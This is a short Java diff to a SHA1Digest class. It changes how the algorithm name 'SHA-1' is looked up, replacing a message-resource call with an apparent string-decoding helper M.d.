@@ -12,9 +12,9 @@ package com.android.deviceinfo.crypto;
 import java.security.MessageDigest;
 import java.security.NoSuchAlgorithmException;
 
-import com.android.deviceinfo.Messages;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.util.Check;
+import com.android.m.M;
 
 // TODO: Auto-generated Javadoc
 /**
@@ -31,7 +31,7 @@ public class SHA1Digest {
 	public SHA1Digest() {
 
 		try {
-			digest = MessageDigest.getInstance(Messages.getString("21_0")); //$NON-NLS-1$
+			digest = MessageDigest.getInstance(M.d("SHA-1")); //$NON-NLS-1$
 		} catch (final NoSuchAlgorithmException e) {
 			if (Cfg.EXCEPTION) {
 				Check.log(e);
